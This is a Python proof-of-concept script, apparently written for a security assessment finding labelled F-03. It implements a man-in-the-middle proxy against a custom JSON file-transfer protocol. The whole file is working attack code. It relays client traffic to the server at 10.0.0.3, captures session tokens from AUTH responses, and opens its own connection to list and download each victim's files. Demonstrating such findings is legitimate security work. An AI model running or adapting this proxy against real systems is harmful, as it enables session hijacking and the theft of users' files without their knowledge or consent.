#!/usr/bin/env python3
"""
mitm_F03.py - Session Token Theft and Hijack
Finding: F-03
Violated: R1, R8
The MITM reads the session token from an AUTH response, then uses it
to issue its own LIST and DOWNLOAD requests directly to the server,
accessing the victim's files without their knowledge.
"""

import socket
import threading
import json
import time

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9000
SERVER_HOST  = "10.0.0.3"
SERVER_PORT  = 9000

stolen_tokens = {}   # username -> token


def send_json(sock, obj):
    sock.sendall((json.dumps(obj) + "\n").encode("utf-8"))


def recv_json(sock):
    buf = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            return None
        buf += chunk
        if b"\n" in buf:
            line, _ = buf.split(b"\n", 1)
            return json.loads(line.decode("utf-8"))


def exploit_token(username, token):
    """Open a direct connection to the server and use the stolen token."""
    print(f"\n[F-03 EXPLOIT] Stolen token for '{username}': {token}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_HOST, SERVER_PORT))

        # Step 1: List victim's files
        send_json(s, {"action": "LIST", "token": token})
        resp = recv_json(s)
        print(f"[F-03 EXPLOIT] LIST response for '{username}': {json.dumps(resp)}")

        # Step 2: Download each file
        files = resp.get("files", []) if resp else []
        for f in files:
            send_json(s, {"action": "DOWNLOAD", "token": token, "filename": f["name"]})
            dresp = recv_json(s)
            print(f"[F-03 EXPLOIT] DOWNLOAD '{f['name']}': content={repr(dresp.get('content', ''))}")

        s.close()
    except Exception as e:
        print(f"[F-03 EXPLOIT] Error: {e}")


last_seen_user = [None]


def forward(src, dst, label):
    buf = b""
    try:
        while True:
            chunk = src.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                try:
                    obj = json.loads(line.decode("utf-8"))
                    # Track which user is authenticating
                    if label == "C->S" and obj.get("action") == "AUTH":
                        last_seen_user[0] = obj.get("username")
                    # Capture token from AUTH response
                    if label == "S->C" and obj.get("status") == "ok" and "token" in obj:
                        token = obj["token"]
                        if token != "account created" and last_seen_user[0]:
                            username = last_seen_user[0]
                            stolen_tokens[username] = token
                            threading.Thread(
                                target=exploit_token,
                                args=(username, token),
                                daemon=True
                            ).start()
                except Exception:
                    pass
                dst.sendall(line + b"\n")
    except Exception:
        pass
    finally:
        try:
            dst.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def handle_connection(client_sock, client_addr):
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((SERVER_HOST, SERVER_PORT))
    except Exception as e:
        print(f"[MITM] Cannot connect to server: {e}")
        client_sock.close()
        return

    t1 = threading.Thread(target=forward, args=(client_sock, server_sock, "C->S"), daemon=True)
    t2 = threading.Thread(target=forward, args=(server_sock, client_sock, "S->C"), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    client_sock.close()
    server_sock.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(5)
    print(f"[F-03] Token theft active — waiting for AUTH...")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_connection, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
